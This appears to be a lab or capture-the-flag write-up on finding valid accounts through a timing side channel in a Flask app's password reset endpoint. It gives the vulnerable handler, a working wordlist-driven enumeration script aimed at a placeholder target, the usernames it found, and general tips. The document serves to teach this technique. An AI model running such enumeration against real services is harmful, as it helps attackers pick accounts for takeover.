# User Enumeration via Response Timing (53%)

## Target

Python/Flask app with bcrypt + email-based password reset. Login uses combined query (patched). Password reset `/reset` endpoint is vulnerable.

## Vulnerability

```python
@app.route('/reset', methods=['GET', 'POST'])
def reset():
    username = request.form['username']
    user = User.query.filter_by(username=username).first()
    send_email(user.username)   # Only runs if user exists — throws AttributeError for invalid users
    # Exception silently swallowed by except: pass
```

`send_email()` (SMTP) takes ~1.5s. Invalid usernames skip it → ~0.2s. Measurable timing oracle.

## Key Insight: Read Source Before Targeting

The login endpoint was already PATCHED (combined username+password hash query — no timing difference). The vulnerability was on `/reset`, not `/login`. Always read source for ALL auth endpoints.

## Exploit Script

```python
import requests

URL = "http://TARGET/reset"
WORDLIST = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
THRESHOLD_S = 0.8  # baseline ~0.2s, valid ~1.5s

with open(WORDLIST, 'r') as f:
    for username in f:
        username = username.strip()
        r = requests.post(URL, data={"username": username}, timeout=10)
        if r.elapsed.total_seconds() > THRESHOLD_S:
            print(f"Valid Username: {username} ({r.elapsed.total_seconds():.3f}s)")
```

**Verify candidates** — run multiple requests against hits to eliminate false positives (network jitter can cause one-off spikes).

## Result

Valid username: `frankie`

(`martin` and `shaved` were false positives — confirmed by re-testing: dropped to ~0.2s baseline)

## Key Notes

- Always check ALL auth endpoints (login, register, reset, unlock) for timing side-channels
- Email sending is a high-value timing oracle — SMTP takes hundreds of ms to seconds
- False positives happen — verify each candidate with 2+ requests
- Baseline: ~0.2s (no email). Valid user: ~1.5s. Threshold: 0.8s worked cleanly
- The `except: pass` pattern in the reset handler silently eats the `AttributeError` on `None.username` — attacker gets same response regardless of validity
